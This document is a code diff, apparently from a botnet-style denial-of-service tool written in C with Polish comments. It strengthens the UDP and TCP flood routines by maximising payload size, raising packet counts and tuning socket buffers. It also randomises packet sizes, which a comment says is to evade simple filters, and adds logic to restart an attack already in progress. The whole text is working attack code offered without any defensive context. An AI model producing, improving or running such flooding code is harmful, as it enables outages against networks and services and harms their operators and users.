@@ -40,17 +40,22 @@ void *udp_flood(void *arg) {
     target.sin_port = htons(args->port);
     target.sin_addr.s_addr = inet_addr(args->ip);
 
-    char payload[1024];
-    for(int i = 0; i < 1024; i++) payload[i] = rand() % 255;
+    char payload[65507]; // Max UDP payload
+    for(int i = 0; i < 65507; i++) payload[i] = rand() % 255;
 
     while(time(NULL) < attack_end_time && !stop_attack) {
         int sock = socket(AF_INET, SOCK_DGRAM, 0);
-        // Połączenie gniazda UDP optymalizuje rutowanie w jądrze (szybsze send zamiast sendto)
+        // Optymalizacja buffora dla max predkosci
+        int bufsize = 1024 * 1024;
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+        
         connect(sock, (struct sockaddr *)&target, sizeof(target));
         
-        for(int i = 0; i < 500; i++) {
+        for(int i = 0; i < 2000; i++) {
             if(stop_attack) break;
-            send(sock, payload, 1024, MSG_NOSIGNAL);
+            // Losowy rozmiar pakietu by omijac proste filtry
+            int size = (rand() % 64000) + 1024; 
+            send(sock, payload, size, MSG_NOSIGNAL);
         }
         close(sock);
     }
@@ -71,11 +76,14 @@ void *tcp_flood(void *arg) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         set_linger(sock); // Zapobiega TIME_WAIT
         
+        int flag = 1;
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
+        
         fcntl(sock, F_SETFL, O_NONBLOCK);
         connect(sock, (struct sockaddr *)&target, sizeof(target));
         
-        // Pompujemy pakiety od razu, nawet jak connect jest non-blocking
-        for(int i = 0; i < 50; i++) {
+        // Pompujemy śmieci w otwarte gniazdo
+        for(int i = 0; i < 1000; i++) {
             if(stop_attack) break;
             send(sock, payload, 1024, MSG_NOSIGNAL);
         }
@@ -115,6 +123,10 @@ void *http_flood(void *arg) {
 }
 
 void start_attack(char *method, char *ip, int port, int duration) {
+    if (!stop_attack && attack_end_time > time(NULL)) {
+        stop_attack = 1;
+        sleep(1); // Czekamy chwile az stare watki obumra
+    }
     stop_attack = 0;
     attack_end_time = time(NULL) + duration;
     
